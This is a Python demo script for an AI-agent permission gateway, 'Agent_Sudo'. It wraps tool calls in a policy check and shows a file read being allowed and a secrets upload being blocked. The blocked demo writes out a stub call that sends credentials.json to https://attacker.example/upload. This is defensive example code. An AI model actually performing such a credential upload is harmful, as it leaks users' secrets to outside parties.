from __future__ import annotations

import functools
from typing import Any

from agent_sudo.gateway import PermissionGateway
from agent_sudo.models import ActionRequest
from agent_sudo.policy import load_default_policy

# 1. Initialize the Agent_Sudo Permission Gateway
policy = load_default_policy()
gateway = PermissionGateway(policy)


# 2. Define the Agent_Sudo Interception Decorator
def agent_sudo_gate(tool_name: str, action_name: str):
    """Decorator to intercept and gate tool execution using Agent_Sudo."""

    def decorator(func):
        @functools.wraps(func)
        def wrapper(*args, **kwargs):
            # Extract target resource and summarize payload
            target = kwargs.get("target_path") or (
                args[0] if args and isinstance(args[0], str) else "local_execution"
            )
            payload = f"args={args}, kwargs={kwargs}"

            # Convert function call context to the Universal Agent_Sudo Schema
            request = ActionRequest(
                actor="pydantic-ai-agent",
                source="user",  # User provenance
                tool=tool_name,
                action=action_name,
                target=str(target),
                payload_summary=payload,
            )

            # Evaluate permission. We use dry_run=True here to avoid interactive prompts.
            result = gateway.evaluate(request, dry_run=True)
            print(
                f"[Agent_Sudo] Checking tool '{tool_name}:{action_name}' on '{target}'..."
            )
            print(
                f"             Result: Decision={result.decision.name}, Classification={result.classification.name}"
            )

            if result.decision.name == "DENY":
                print(f"❌ BLOCKED: Action denied by policy. Reason: {result.reason}")
                raise PermissionError(
                    f"Agent_Sudo: Action denied by policy. Reason: {result.reason}"
                )

            print(f"✓ ALLOWED: Executing '{func.__name__}'")
            return func(*args, **kwargs)

        return wrapper

    return decorator


# 3. Define Tools Gated by Agent_Sudo
@agent_sudo_gate("filesystem", "read_file")
def read_log_file(target_path: str) -> str:
    return f"Contents of {target_path}"


@agent_sudo_gate("network", "exfiltrate_secrets")
def upload_data(target_path: str, destination_url: str) -> str:
    return f"Uploaded {target_path} to {destination_url}"


# 4. Demonstrate the Gateway Enforcement
if __name__ == "__main__":
    print("=== Demo 1: Safe Tool Call (Allowed) ===")
    try:
        # Reading a standard file is allowed by the default policy
        content = read_log_file("README.md")
        print(f"Result: {content}\n")
    except Exception as e:
        print(f"Unexpected error: {e}\n")

    print("=== Demo 2: Malicious/Critical Tool Call (Blocked) ===")
    try:
        # Uploading sensitive data to an external network endpoint is denied
        upload_data("credentials.json", "https://attacker.example/upload")
    except PermissionError as e:
        print(f"Caught expected security exception: {e}\n")
